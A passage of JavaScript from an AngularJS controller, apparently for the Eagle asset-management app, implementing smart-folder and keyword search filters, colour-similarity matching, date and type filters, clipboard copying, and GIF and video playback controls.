                $scope.commentRect = undefined;

                // 記住上次播放位置
                $scope.rememberVideoCurrentTime($scope.current); $scope.current = undefined;
                $timeout.cancel(zoomInitTimeout);

                setTimeout(function() {
                    if ($scope.isDetailMode) return;
                    $(".content-panel.detail-mode").removeClass("inline-mode open");
                    $(".smooth_zoom_preloader").scrollLeft(0);
                }, 50);

                $scope.isInlineMode = false;
                $scope.fadeOutDetailMode();
                $("#detail-container").smoothZoom('cleanBitmapViewer');
                $("#detail-container").smoothZoom('clearPreloadData');
                
                if ($scope.isGifReady === true) {
                    $scope.isGifReady = false;
                    delete $scope.gifViewer.frames;
                    $scope.gifViewer.frames = [];
                    $scope.gifViewer.mousedownTime = 0;
                    $scope.gifViewer.mousedownX = 0;
                    $scope.gifViewer.mousedownY = 0;
                    $scope.gifViewer.range = undefined;
                    $scope.gifPlayer = undefined;
                }
                clearInterval($scope.gifUpadteInterval);
            }
        };

        $scope.rememberVideoCurrentTime = function(item) {
            if (!item) return;
            if (VIDEO_TYPES[item.ext]) {
                var $video = $(".video-js video")[0];
                if ($video) {
                    var currentTime = $video.currentTime;
                    localStorage.setItem("eagle.videoPlayer.currentTime." + item.id, currentTime);
                }
            }
        };

        $scope.copyImages = function(event) {
            if ($scope.viewMode === 'alltags') {
                var selectedTags = $scope.getSelectedTags();
                if (selectedTags && selectedTags.length > 0) {
                    clipboard.writeText(selectedTags.join(","));
                    $scope.notify({
                        message: $filter('i18n')("Context.Tag.Copy.Success"),
                        duration: 1000
                    });
                }
            }
            else {
                if ($rootScope.currentFocus == "sidebar") {
                    if ($rootScope.selectedFolders.length > 0) {
                        let copyText = "";
                        $rootScope.selectedFolders.forEach(function (folder, index) {
                            copyText += folder.name;
                            if (index < $rootScope.selectedFolders.length - 1) {
                                copyText += "\n";
                            }
                        });
                        clipboard.writeText(copyText);
                    }
                    else if ($rootScope.selectedSmartFolders.length > 0) {
                        let copyText = "";
                        $rootScope.selectedSmartFolders.forEach(function (folder, index) {
                            copyText += folder.name;
                            if (index < $rootScope.selectedSmartFolders.length - 1) {
                                copyText += "\n";
                            }
                        });
                        clipboard.writeText(copyText);
                    }
                    else if ($scope.currentSmartFolder) {
                        clipboard.writeText($scope.currentSmartFolder.name);
                    }
                    else if ($scope.currentFolder) {
                        clipboard.writeText($scope.currentFolder.name);
                    }
                }
                else if ($scope.selected.length > 0) {
                    ipcRenderer.sendTo(backgroundWindowID, 'copy-images', $scope.selected);
                    RecentFileManager.addFiles($scope.selected);
                    setTimeout(function () {
                        $scope.notify({
                            message: $filter('i18n')("previewWindow.copied"),
                            duration: 1000
                        });
                    }, 150);
                }
            }
        };

        $scope.lockImageFilter = function(image) {
            return !$scope.lockedImages[image.id];
        };

        $scope.contentFilter = function(image) {
            try {
                if ($rootScope.selectedSmartFolders.length > 0) {
                    if (image.isDeleted) return false;
                    for (let i = 0; i < $rootScope.selectedSmartFolders.length; i++) {
                        let smartFolder = $rootScope.selectedSmartFolders[i];
                		if ($scope.existInSmartFilter(smartFolder, image)) {
                            return true;
                        }
                    }
                    return false;
                }
                else if ($scope.currentSmartFolder) {
                	if (image.isDeleted) return false;
                	if ($scope.currentSmartFolder.children && $scope.currentSmartFolder.children.length === 0 && $scope.currentSmartFolder.conditions && $scope.currentSmartFolder.conditions.length === 0) {
                		return false;
                	}
                	else if ($scope.currentSmartFolder.children && $scope.currentSmartFolder.children.length > 0 && $scope.currentSmartFolder.conditions && $scope.currentSmartFolder.conditions.length === 0) {
                		for (let i = 0; i < $scope.currentSmartFolder.children.length; i++) {
    	                    let smartFolder = $scope.currentSmartFolder.children[i];
    	            		if ($scope.existInSmartFilter(smartFolder, image)) {
    	                        return true;
    	                    }
    	                }
    	                return false;
                	}
                	else {
                		return $scope.existInSmartFilter($scope.currentSmartFolder, image);
                	}
                }
                switch ($scope.viewMode) {
                    case "all":
                        if (!image.isDeleted) return true;
                        break;
                    case "unfiled":
                        if (image.isDeleted) return false;
                        if (!image.folders || image.folders.length === 0 || (image.folders.length === 1 && image.folders[0] && !$scope.folderMappings[image.folders[0]])) {
                            return true;
                        }
                        break;
                    case "untagged":
                        if (image.isDeleted) return false;
                        if (!image.tags || image.tags.length === 0) {
                            return true;
                        }
                        break;
                    case "random":
                        if (!image.isDeleted) return true;
                        break;
                    case "recent":
                        return (RecentFileManager.isExists(image));
                        break;
                    case "trash":
                        if (image.isDeleted) return true;
                        break;
                    default:
                        // 文件夹多选
                        if ($rootScope.selectedFolders.length > 0) {
                            if (image.isDeleted) return false;
                            for (var i = 0; i < $rootScope.selectedFolders.length; i++) {
                                var folder = $rootScope.selectedFolders[i];
                                if (isInFolder(image, folder)) {
                                    return true;
                                }
                            }
                        }
                        // 文件夹单选
                        else if ($scope.currentFolder) {
                            if (image.isDeleted) return false;
                            if (isInFolder(image, $scope.currentFolder)) {
                                return true;
                            }
                            return false;
                        } else if ($scope.currentTag) {
                            if (image.isDeleted) return false;
                            return image.tags.indexOf($scope.currentTag) > -1;
                        }
                        return false;
                }
                return false;
            }
            catch (err) {
                return false;
            }
        };

        function getChildFoldersMaps (folders) {
            var childs = {};
            for (var i = 0; i < folders.length; i++) {
                var folder = folders[i];
                eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                    childs[child.id] = true;
                });
            }
            return childs;
        }

        function getChildFoldersMap (folder) {
            var childs = {};
            eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                childs[child.id] = true;
            });
            return childs;
        }

        $scope.addToRecentFolders = function (folderIDs) {
            if (!folderIDs || folderIDs.length == 0 ) return;
            var recentMoveFolders = localStorage.getItem("recentMoveFolders");
            if (recentMoveFolders) {
                recentMoveFolders = JSON.parse(recentMoveFolders);
            }
            else {
                recentMoveFolders = [];
            }
            folderIDs.forEach(function (folderID) {
                recentMoveFolders.unshift(folderID);
            });
            recentMoveFolders = recentMoveFolders.unique();
            recentMoveFolders = recentMoveFolders.slice(0, 50);

            localStorage.setItem("recentMoveFolders", JSON.stringify(recentMoveFolders));
        };

        $scope.getLibraryHistory = function (length) {
            let result = [];
            $scope.libraryHistory.forEach(function (history, index) {

                var libraryName = path.basename(history).replace('.library', '');
                var libraryPath = path.dirname(history).replace(/\\$/g, "").replace(/\/$/, "");

                if (length === undefined) {
                    result.push({
                        name: libraryName,
                        dir: libraryPath,
                        path: history
                    });
                }
                else if (index + 1 < length) {
                    result.push({
                        name: libraryName,
                        dir: libraryPath,
                        path: history
                    });
                }
            });
            return result;
        };

        $scope.removeRecentFolder = (folderId, callback) => {
            let recentMoveFolders = localStorage.getItem("recentMoveFolders");
            if (recentMoveFolders) {
                recentMoveFolders = JSON.parse(recentMoveFolders);

                const idx = recentMoveFolders.indexOf(folderId);
                if (idx > -1) {
                    recentMoveFolders.splice(idx, 1);
                }
                recentMoveFolders = recentMoveFolders.unique();
                recentMoveFolders = recentMoveFolders.slice(0, 50);

                localStorage.setItem("recentMoveFolders", JSON.stringify(recentMoveFolders));
                callback && callback();
            }
        };

        $scope.getRecentFolders = function (length) {
            var len = length;
            if (!length) len = 8;
            var recentMoveFolders = localStorage.getItem("recentMoveFolders");
            if (recentMoveFolders) {
                recentMoveFolders = JSON.parse(recentMoveFolders);
                recentMoveFolders = recentMoveFolders.slice(0, len);
            }
            else {
                return [];
            }

            recentMoveFolders = recentMoveFolders.filter(function (folderId) {
                return !!$scope.folderMappings[folderId];
            });

            var recentFolders = recentMoveFolders.map(function (folderId) {
                return $scope.folderMappings[folderId];
            });

            recentFolders = [...new Set(recentFolders)];
            return recentFolders;
        };

        $scope.getRecentFoldersForAPI = function (length) {
            var len = length;
            if (!length) len = 8;
            var recentMoveFolders = localStorage.getItem("recentMoveFolders");
            if (recentMoveFolders) {
                recentMoveFolders = JSON.parse(recentMoveFolders);
                recentMoveFolders = recentMoveFolders.slice(0, len);
            }
            else {
                return [];
            }

            recentMoveFolders = recentMoveFolders.filter(function (folderId) {
                return !!$scope.folderMappings[folderId];
            });

            var recentFolders = recentMoveFolders.map(function (folderId) {
                return $scope.folderMappings[folderId];
            });

            if (!length && recentFolders.length < 8) {
            	for (var i = 0; i < $scope.folderList.length; i++) {
            		if (i > 8) break;
            		var id = $scope.folderList[i].id;
            		if ($scope.folderMappings[id]) {
            			recentFolders.push($scope.folderMappings[id]);
            		}
            	}
            }

            recentFolders = [...new Set(recentFolders)];
            return recentFolders;
        };

        // 取得继承炼的标签
        function getExtendTags (folder, tags) {
            try {
                if (folder.tags) {
                    folder.tags.forEach(function (tag) {
                        tags.push(tag);
                    });
                }
                var parent = $scope.folderMappings[folder.parent];
                if (parent && parent.tags && folder.parent) {
                    return getExtendTags(parent, tags);
                }
                else {
                    return tags.unique().reverse();
                }
            }
            catch (err) {
                return tags.unique().reverse();
                electronLog && electronLog.error(err.stack || err);
            }
        }

        $scope.getAncestorFolders = getAncestorFolders;

        // 判断图片是否属于当前文件夹
        function isInFolder (image, folder) {
            try {
            	if (!folder) return false;
                if (!image) return false;
                if (!image.folders || !image.folders.indexOf) {
                    image.folders = [];
                }
                // 状况1: 该资料夹本身包含图片
                var isContain = image.folders.indexOf(folder.id) > -1;
                if ($scope.showSubfolderContent) {
                    // 状况2: 该资料夹不包含图片，但该资料夹的子文件夹包含
                    // 加速版本作法，更快判断图片是否存在于子文件夹
                    if ($scope.currentFolderChildren) {
                        for (var i = 0; i < image.folders.length; i++) {
                            var folderId = image.folders[i];
                            if ($scope.currentFolderChildren[folderId]) {
                                return true;
                            }
                        }
                    }
                    else {
                        eagle.utils.tree.walk(folder.children, 'children', function (child, parent) {
                            if (image.folders && image.folders.length > 0 && image.folders.indexOf(child.id) > -1) {
                                isContain = true;
                                return;
                            }
                        });
                    }
                }
                return isContain;
            }
            catch (err) {
                return false;
            }
        }
        $scope.isInFolder = isInFolder;


        // 智能文件夹筛选
        $scope.existInSmartFilter = function(smartFolder, image) {
        	try {
	            var conditions = smartFolder.conditions;
	            
	            for (var i = 0; i < smartFolder.conditions.length; i++) {
                    var boolean = smartFolder.conditions[i].boolean || "TRUE";
	                var isMatch = isMatchCondition(smartFolder.conditions[i], image);
                    if (boolean === "FALSE") {
                        isMatch = !isMatch;
                    }
	                if (!isMatch) return false;
	            }
	            let parent = $scope.smartFolderMappings[smartFolder.parent];
	            if (parent) {
	            	return $scope.existInSmartFilter(parent, image);
	            }
	            else {
	            	return true;
	            }
	        }
	        catch (err) {
	        	return false;
	        }
        };

        const MATCH_FUNCTION = {
        	"name": isMatchNameRule,
			"folderName": isMatchFolderNameRule,
			"url": isMatchUrlRule,
			"annotation": isMatchAnnotationRule,
			"comments": isMatchCommentsRule,
			"width": isMatchWidthRule,
			"height": isMatchHeightRule,
			"fileSize": isMatchFileSizeRule,
			"createTime": isMatchTimeRule,
			"mtime": isMatchMTimeRule,
            "btime": isMatchBTimeRule,
			"tags": isMatchTagsRule,
			"rating": isMatchRatingRule,
			"folders": isMatchFoldersRule,
			"type": isMatchTypeRule,
			"shape": isMatchShapeRule,
			"color": isMatchColorRule,
			"duration": isMatchDurationRule,
			"bpm": isMatchBPMRule,
			"camera": isMatchCameraRule,
			"iso": isMatchISORule,
			"aperture": isMatchApertureRule,
			'focalLength': isMatchFocalLengthRule,
			'shutter': isMatchShutterRule,
			"timestamp": isMatchTimestampRule,
			"fontActivated": isMatchFontActivatedRule
        }

        function isMatchCondition (condition, image) {

            var allMatch = true; // 全部符合

            for (let i = 0; i < condition.rules.length; i++) {
                var isMatch = false;
                isMatch = MATCH_FUNCTION[condition.rules[i].property](condition.rules[i], image);

                // 如果有任何一調規則沒有 match，交集狀態必為 false
                if (!isMatch) {
                    allMatch = false;
                }
                // 交集判斷不需要等待所有條件計算完畢
                if (condition.match === "AND" && !isMatch) {
                    return false;
                }
                // 假如是聯集且有任何一條規則已經 match
                else if (condition.match === "OR" && isMatch) {
                    return true;
                }
            }

            // 如果全不符合
            if (allMatch) {
                return true;
            }

            return false;
        };

        function isMatchSearchFilter (allText) {

        }

        $scope.searchFilter = function(image) {
            try {
                var isMatch = false;

                for (var i = 0; i < $scope.keywords.length; i++) {

                    var keyword = $scope.keywords[i];
                    var isNotLogic = keyword[0] === "-";
                    var isFullMathLogic = keyword[0] === `"` && keyword[keyword.length - 1] === `"`;

                    if (keyword === "-") continue;

                    var name = image.name,
                        annotation = image.annotation,
                        ext = image.ext,
                        url = image.url,
                        camera = "",
                        postScriptName = "",
                        ocrText = image?.ocr?.text ?? "",
                        allText = "";

                    if (image.fontMetas && image.fontMetas.postScriptName) {
                        try {
                            postScriptName = JSON.stringify(image.fontMetas);
                        }
                        catch (err) {}
                    }

                    if (image.text) {
                    	allText += image.text.toLowerCase() + " ";
                    }

                    if (image.rawMetas && image.rawMetas.camera) {
                        try {
                            camera = image.rawMetas.camera;
                            allText += `${camera} `;
                        }
                        catch (err) {}
                    }

                    if (name && $scope.isSearchScopeName) {
                        allText += `${name}`;
                    }

                    if (ext && $scope.isSearchScopeExt) {
                        allText += `.${ext} `;
                    }
                    
                    if (url && $scope.isSearchScopeUrl) {
                        if ($scope.keyword.length >= 2) {
                            allText += `${url} `;
                        }
                    }
                    
                    if (annotation && $scope.isSearchScopeNote) {
                        allText += `${annotation} `;
                    }

                    if (ocrText && $scope.isSearchScopeOCR) {
                        allText += `${ocrText} `;
                    }

                    // 提前判断，如果已经符合，就不需要下面的复杂判断
                    allText = allText.toLowerCase();

                    if (isNotLogic) {
                        
                    }
                    else if (isFullMathLogic) {
                        if (name === keyword.replace(/"/g, '')) {
                            isMatch = true;
                            continue;
                        }
                        else {
                            var textArray = name.toLowerCase().split(/[ ，,;、]+/);
                            if (textArray.indexOf(keyword.replace(/"/g, '')) > -1) {
                                isMatch = true;
                                continue;
                            }
                            else {
                                // return false;
                            }
                        }
                    }
                    else {
                        if ( (i18n.locale !== "zh_CN" && i18n.locale !== "zh_TW" && i18n.locale !== "en") || $scope.isContainAlphabet) {
                            if (allText.indexOf(keyword) != -1) {
                                isMatch = true;
                                continue;
                            }
                            else {
                                
                            }
                        }
                        else {
                            let keyword = $scope.keywords[i];
                            let keyword_cn = $scope.keywords_cn[i];
                            let keyword_tw = $scope.keywords_tw[i];
                            if (allText.indexOf(keyword) != -1) {
                                isMatch = true;
                                continue;
                            }
                            else if ( (keyword !== keyword_cn) && allText.indexOf(keyword_cn) != -1) {
                                isMatch = true;
                                continue;
                            }
                            else if ( (keyword !== keyword_tw) && allText.indexOf(keyword_tw) != -1) {
                                isMatch = true;
                                continue;
                            }
                        }
                    }

                    var annotations = "";
                    if ($scope.isSearchScopeAnnotation) {
                        if (image.comments) {
                            image.comments.forEach(function(comment) {
                                annotations += comment.annotation;
                            })
                        }
                        allText += `${annotations} `;
                    }

                    // Note: 针对字体文件，额外添加几个栏位
                    if (image.ext && FONT_TYPES[image.ext]) {
                        var fontMetas = image.fontMetas;
                        var preferLng = "zh";
                        if (fontMetas) {
                            var fullName = _.get(fontMetas, `fullName.${preferLng}`, undefined) || _.get(fontMetas, `fullName.en`, "")
                            allText += fullName;
                            if ($scope.keyword.length > 2) {
                                allText += `${postScriptName} `;
                            }
                        }
                    }

                    var tagsString = "";
                    if ($scope.isSearchScopeTag && image.tags && image.tags.length > 0) {
                        for (var ti = 0; ti < image.tags.length; ti++) {
                            if (image.tags[ti]) {
                                tagsString += `${image.tags[ti]} `;
                            }
                        }
                        allText += `${tagsString} `;
                    }

                    // 这个很花时间，如果图片名称就已经符合条件，应立即 return 不该等到这个时间
                    var folderNames = " ";
                    var folderDescriptions = " ";
                    if ($scope.isSearchScopeFolderDesc || $scope.isSearchScopeFolderName) {
                        if (image.folders && image.folders.length > 0) {
                            for (var fi = 0; fi < image.folders.length; fi++) {
                                var folderId = image.folders[fi];
                                var folder = $scope.folderMappings[folderId];
                                if (folder) {
                                    if ($scope.isSearchScopeFolderName && folder && folder.name) {
                                        folderNames += `${folder.name} `;
                                    }
                                    if ($scope.isSearchScopeFolderDesc && folder.description) {
                                        folderDescriptions += `${folder.description} `;
                                    }
                                }
                            }
                        }
                        allText += folderNames;
                        allText += folderDescriptions;
                    }

                    allText = allText.toLowerCase();
                    
                    if (isNotLogic) {
                        var notKeyword = keyword.replace("-", "");
                        if (notKeyword && allText.indexOf(notKeyword) != -1) {
                            return false;
                        }
                        else {
                            isMatch = true;
                        }
                    }
                    else if (isFullMathLogic) {
                        keyword = keyword.replace(/"/g, '');
                        if (name === keyword) {
                            isMatch = true;
                        }
                        else {
                            var textArray = name.toLowerCase().split(/[ ，,;、]+/);
                            if (textArray.indexOf(keyword) > -1) {
                                isMatch = true;
                            }
                            else {
                                return false;
                            }
                        }
                    }
                    else {

                        if ( (i18n.locale !== "zh_CN" && i18n.locale !== "zh_TW" && i18n.locale !== "en") || $scope.isContainAlphabet) {
                            if (allText.indexOf(keyword) != -1) {
                                isMatch = true;
                            }
                            else {
                                return false;
                            }
                        }
                        else {
                            let keyword = $scope.keywords[i];
                            let keyword_cn = $scope.keywords_cn[i];
                            let keyword_tw = $scope.keywords_tw[i];
                            if (allText.indexOf(keyword) != -1) {
                                isMatch = true;
                            }
                            else if ( (keyword !== keyword_cn) && allText.indexOf(keyword_cn) != -1) {
                                isMatch = true;
                            }
                            else if ( (keyword !== keyword_tw) && allText.indexOf(keyword_tw) != -1) {
                                isMatch = true;
                            }   
                            else {
                                return false;
                            }
                        }
                    }
                }

                return isMatch;
            }
            catch (err) {}
            return false;
        };

        eagle.filter.filterRules.color.value = undefined;

        $scope.openColorPicker = function () {
            $("#colors-picker").click();
        };

        $scope.openQuickSearch = function (event) {
            $rootScope.$broadcast('OPEN_QUICK_SEARCH_MODAL');
        };

        $scope.closeQuickSearch = function (event) {
            $rootScope.$broadcast('CLOSE_QUICK_SEARCH_MODAL');
        };

        $scope.filterWithHexColor = function(hex) {
            if (hex.length === 6 && !hex.startsWith("#") && /^[0-9A-F]{6}$/i.test(hex) ) {
                hex = "#" + hex;
                $scope.hexColor = hex;
            }
            if (hex && hex.length == 7) {
                var rgb = $scope.hexToRGB(hex);
                $scope.filterWithColor(rgb);
            }
            else if (hex && hex == "gray") {
                $scope.filterWithColor("gray");
            }
        };

        $scope.adjustColorAccuracy = function() {
            $scope.filterWithHexColor($scope.hexColor);
        };

        $scope.filterWithColor = function(color, ignoreHistory) {

            if (!color || eagle.filter.filterRules.color.value == color) {
                eagle.filter.filterRules.color.value = undefined;
                eagle.filter.filterRules.color.gray = false;
                $scope.hexColor = "";
            }
            else if (color === "gray") {
                eagle.filter.filterRules.color.value = undefined;
                eagle.filter.filterRules.color.gray = true;
                $scope.hexColor = "";
            }
            else {
                eagle.filter.filterRules.color.gray = false;
                eagle.filter.filterRules.color.value = color;
                var hexColor = $scope.rgbToHex(eagle.filter.filterRules.color.value[0], eagle.filter.filterRules.color.value[1], eagle.filter.filterRules.color.value[2]);
                $('#colorpickerHolder').ColorPickerSetColor(hexColor);
                if (hexColor.length > 6) {
                    $scope.hexColor = hexColor;
                }
            }
            eagle.filter.isOpen = true;
            $scope.isDetailMode = false;
            $scope.updateContainerHieght();
            $scope.page = 1;

            $timeout(function () {
                $scope.filterContent();
                $scope.calculateFilterCounts();
            }, 50);
            analytics.event('Filter', 'Color');
        };

        $scope.filterContent = function(type) {
            if (!$scope.isItemBindCalculated) return;
            // 重新计算画面图片列表
            $scope.shuffle = [];
            $scope.rebindRefresh(undefined, $scope.contentFilterCache);
            $scope.$evalAsync();
            $("#box-container").scrollTop(0);
        };

        $scope.typeFilter = function(image) {
            if (!$scope.filterType || $scope.filterType === 'undefined') return true;
            if (image.ext === $scope.filterType) {
                return true;
            }
            if ($scope.filterType === "video") {
                if (VIDEO_TYPES[image.ext]) return true;
            }
            if ($scope.filterType === "powerpoint") {
                if (image.ext == 'ppt' || image.ext == 'pptx' || image.ext == 'potx') return true;
            }
            if ($scope.filterType === "word") {
                if (image.ext == 'doc' || image.ext == 'docx') return true;
            }
            if ($scope.filterType === "excel") {
                if (image.ext == 'xls' || image.ext == 'xlsx') return true;
            }
            if ($scope.filterType === "font") {
                if (FONT_TYPES[image.ext]) return true;
            }
            return false;
        };

        $scope.dateFilterOptions = {
            dateFormat: 'Y-m-d',
            allowInput: false,
            mode: 'range',
            locale: ($scope.language.indexOf('zh') > -1)? "zh": "en",
            onChange: function (selectedDates, dateStr, instance) {
                if (selectedDates.length == 2) {
                    var start = selectedDates[0].getTime();
                    var end = selectedDates[1].getTime();
                    eagle.filter.filterRules.import.type = "range";
                    eagle.filter.filterRules.import.range = [start, end];
                    $scope.rebindRefresh();
                }
            }
        };

        $scope.dateFilter = function(image) {
            if (!eagle.filter.filterRules.import.type || eagle.filter.filterRules.import.type === 'undefined') return true;
            var ONE_DAY = 1000 * 60 * 60 * 24;
            switch (eagle.filter.filterRules.import.type) {
                case 'today':
                    return Date.now() - image.modificationTime < ONE_DAY;
                    break;
                case 'yesterday':
                    return Date.now() - image.modificationTime > ONE_DAY && Date.now() - image.modificationTime < 2 * ONE_DAY;
                    break;
                case '7day':
                    return Date.now() - image.modificationTime < ONE_DAY * 7;
                    break;
                case '30day':
                    return Date.now() - image.modificationTime < ONE_DAY * 30;
                    break;
                case '90day':
                    return Date.now() - image.modificationTime < ONE_DAY * 90;
                    break;
                case '183day':
                    return Date.now() - image.modificationTime < ONE_DAY * 183;
                    break;
                case '365day':
                    return Date.now() - image.modificationTime < ONE_DAY * 365;
                    break;
                case 'range':
                    if (eagle.filter.filterRules.import.range[0] && eagle.filter.filterRules.import.range[1]) {
                        return eagle.filter.filterRules.import.range[0] <= image.modificationTime && image.modificationTime <= eagle.filter.filterRules.import.range[1] + ONE_DAY;
                    }
                    break;
                default:
                    return false;
            }
        };

        function rgb2lab(rgb) {
            var r = rgb[0] / 255,
                g = rgb[1] / 255,
                b = rgb[2] / 255,
                x, y, z;

            r = (r > 0.04045) ? Math.pow((r + 0.055) / 1.055, 2.4) : r / 12.92;
            g = (g > 0.04045) ? Math.pow((g + 0.055) / 1.055, 2.4) : g / 12.92;
            b = (b > 0.04045) ? Math.pow((b + 0.055) / 1.055, 2.4) : b / 12.92;

            x = (r * 0.4124 + g * 0.3576 + b * 0.1805) / 0.95047;
            y = (r * 0.2126 + g * 0.7152 + b * 0.0722) / 1.00000;
            z = (r * 0.0193 + g * 0.1192 + b * 0.9505) / 1.08883;

            x = (x > 0.008856) ? Math.pow(x, 1 / 3) : (7.787 * x) + 16 / 116;
            y = (y > 0.008856) ? Math.pow(y, 1 / 3) : (7.787 * y) + 16 / 116;
            z = (z > 0.008856) ? Math.pow(z, 1 / 3) : (7.787 * z) + 16 / 116;

            return [(116 * y) - 16, 500 * (x - y), 200 * (y - z)]
        }
        // 模糊范围，越小越准确
        eagle.filter.filterRules.color.accuracy = 20;
        $scope.colorFilter = function(image) {

            try {
                // 防呆
                if (!image.palettes || image.palettes.length < 5) return false;

                var ratio0 = image.palettes[0].ratio;
                var r0 = image.palettes[0].color[0];
                var g0 = image.palettes[0].color[1];
                var b0 = image.palettes[0].color[2];
                var rt = eagle.filter.filterRules.color.value[0];
                var gt = eagle.filter.filterRules.color.value[1];
                var bt = eagle.filter.filterRules.color.value[2];

                if (ratio0 < 25) {
                    return false;
                }

                var white = [255, 255, 255];
                var acceptAccuracy1 = eagle.filter.filterRules.color.accuracy;
                var acceptAccuracy2 = (eagle.filter.filterRules.color.accuracy - 10 >= 5) ? eagle.filter.filterRules.color.accuracy - 10 : 3;

                if (!eagle.filter.filterRules.color.value) return true;
                if (!image.palettes || image.palettes.length < 0) return false;
                if (!image.palettes[0]) return false;

                if (image.palettes[1] && image.palettes[0].color[0] == eagle.filter.filterRules.color.value[0] && image.palettes[0].color[1] == eagle.filter.filterRules.color.value[1] && image.palettes[0].color[2] == eagle.filter.filterRules.color.value[2] ||
                    image.palettes[1].color[0] == eagle.filter.filterRules.color.value[0] && image.palettes[1].color[1] == eagle.filter.filterRules.color.value[1] && image.palettes[1].color[2] == eagle.filter.filterRules.color.value[2]) {
                    $scope.colorDistancesMap[image.id] = 0.01;
                    return true;
                }

                // 使用 YUV 相似模型计算 （ 0 ~ 1 ）
                if (ratio0 > 33) {
                    let d1 = colorSimilarityDistance(eagle.filter.filterRules.color.value, image.palettes[0].color);
                    if (d1.d2000 < acceptAccuracy1 && d1.d76 < acceptAccuracy1 + 50) {
                        $scope.colorDistancesMap[image.id] = d1.d76;
                        return true;
                    }
                    if (ratio0 > 50) {
	                    let white_d = colorSimilarityDistance(white, image.palettes[0].color);
	                    if (white_d.d2000 < 5) {
	                    	if (image.palettes[1] && image.palettes[1].ratio > 8) {
		                    	let d2 = colorSimilarityDistance(eagle.filter.filterRules.color.value, image.palettes[1].color);
			                    if (d2.d2000 < acceptAccuracy1 && d2.d76 < acceptAccuracy1 + 50) {
			                        $scope.colorDistancesMap[image.id] = d2.d76 + 5;
			                        return true;
			                    }
	                    	}
	                    }
	                }
                }
                if (image.palettes[1] && image.palettes[1].ratio > 33) {
                    let d2 = colorSimilarityDistance(eagle.filter.filterRules.color.value, image.palettes[1].color);
                    if (d2.d2000 < acceptAccuracy1 && d2.d76 < acceptAccuracy1 + 50) {
                        $scope.colorDistancesMap[image.id] = d2.d76;
                        return true;
                    }
                }

                // 自定义主色
                for (var i = 0; i < image.palettes.length; i++) {
                    var palette = image.palettes[i];
                    if (palette.marked) {
                        var md = colorSimilarityDistance(eagle.filter.filterRules.color.value, palette.color);
                        if (md.d2000 < 30) {
                            $scope.colorDistancesMap[image.id] = md.d76;
                            return true;
                        }
                    }
                }
            }
            catch (err) {
                electronLog && electronLog.error(err.stack || err);
                return false;
            }

            return false;
        };

        // 計算顏色相似性
        function colorSimilarityDistance (color1, color2) {
            var c1 = colorConvert.rgb.lab(color1[0], color1[1], color1[2]);
            var c2 = colorConvert.rgb.lab(color2[0], color2[1], color2[2]);
            var l1 = { L: c1[0], A: c1[1], B: c1[2] };
            var l2 = { L: c2[0], A: c2[1], B: c2[2] };
            var d76 = DeltaE.getDeltaE76(l1, l2);
            var d2000 = DeltaE.getDeltaE00(l1, l2);
            return {
            	d76: d76,
            	d2000: d2000,
            };
        };

        $scope.grayColorFilter = function(image) {
            if (image && image.palettes) {
                for (var i = image.palettes.length - 1; i >= 0; i--) {
                    var palette = image.palettes[i];
                    if (palette.ratio >= 0.02) {
                        var r = palette.color[0];
                        var g = palette.color[1];
                        var b = palette.color[2];
                        if ( Math.abs(r-g) >= 8 || Math.abs(r-b) >= 8 || Math.abs(g-b) >= 8 ) {
                            return false;
                        }
                    }
                }
                return true;
            }
            return false;
        };

        $scope.toggleGifPlayerMode = function () {
            $scope.usingGifPlayer = !$scope.usingGifPlayer;
            analytics.event('GifViewer', 'Open');
        };

        $scope.toggleGifPlay = function() {
            if ($scope.gifPlayer && $scope.isGifReady) {
                if ($scope.gifViewer.playing) {
                    $scope.gifPlayer.pause();
                    $scope.gifViewer.playing = false;
                    $scope.$evalAsync();
                }
                else {
                    $scope.gifPlayer.play();
                    $scope.gifViewer.playing = true;
                    $scope.$evalAsync();
                }
                $(".gif-viewer").css("opacity", 0.8);
                setTimeout(function () {
                    $(".gif-viewer").css("opacity", 1);
                }, 100);
            }
        };

        $scope.nextGifFrame = function(amount = 1) {
            if ($scope.gifPlayer && $scope.isGifReady) {
                $scope.gifPlayer.pause();
                $scope.gifViewer.playing = false;
                var curr = $scope.gifPlayer.get_current_frame();
                var total = $scope.gifViewer.frames.length;
                var idx = curr + amount;
                if (idx > total) idx = total - 1;
                $scope.gifPlayer.move_to(idx);
                $scope.$evalAsync();
            }
        };

        $scope.prevGifFrame = function(amount = 1) {
            if ($scope.gifPlayer && $scope.isGifReady) {
                $scope.gifPlayer.pause();
                $scope.gifViewer.playing = false;
                var curr = $scope.gifPlayer.get_current_frame();
                var idx = curr - amount;
                if (idx < 0) idx = 0;
                $scope.gifPlayer.move_to(idx);
                $scope.$evalAsync();
            }
        };

        $scope.toggleVideoPlay = function() {
            var video = $(".detail-wrap video")[0];
            if (!video.paused) { video.pause(); } else { video.play(); }
        };

        $scope.speedUp = function() {
            let playbackRates = [0.25, 0.5, 0.75, 1, 1.25, 1.5, 1.75, 2, 3, 4, 8];
            if ($scope.isDetailMode) {
                if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
                    var video = $(".detail-wrap video")[0];
                    if (video) { 
                        let currnt = video.playbackRate;
                        let idx = playbackRates.indexOf(currnt);
                        if (idx !== -1 && playbackRates[idx + 1]) {
                            video.playbackRate = playbackRates[idx + 1];
                        }
                    }
                }
                else if ($scope.current.ext == 'gif') {
                    let currnt = $scope.gifViewer.speed;
                    let idx = playbackRates.indexOf(currnt);
                    if (idx !== -1 && playbackRates[idx + 1]) {
                        $scope.gifViewer.setSpeed(playbackRates[idx + 1]);
                    }
                }
            }
        };

        $scope.speedDown = function() {
            let playbackRates = [0.25, 0.5, 0.75, 1, 1.25, 1.5, 1.75, 2, 3, 4, 8];
            if ($scope.isDetailMode) {
                if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
                    var video = $(".detail-wrap video")[0];
                    if (video) { 
                        let currnt = video.playbackRate;
                        let idx = playbackRates.indexOf(currnt);
                        if (idx !== -1 && playbackRates[idx - 1]) {
                            video.playbackRate = playbackRates[idx - 1];
                        }
                    }
                }
                else if ($scope.current.ext == 'gif') {
                    let currnt = $scope.gifViewer.speed;
                    let idx = playbackRates.indexOf(currnt);
                    if (idx !== -1 && playbackRates[idx - 1]) {
                        $scope.gifViewer.setSpeed(playbackRates[idx - 1]);
                    }
                }
            }
        };

        $scope.stepForward = function() {
            if ($scope.isDetailMode) {
                if (VIDEO_TYPES[$scope.current.ext]) {
                    var video = $(".detail-wrap video")[0];
                    if (video) { 
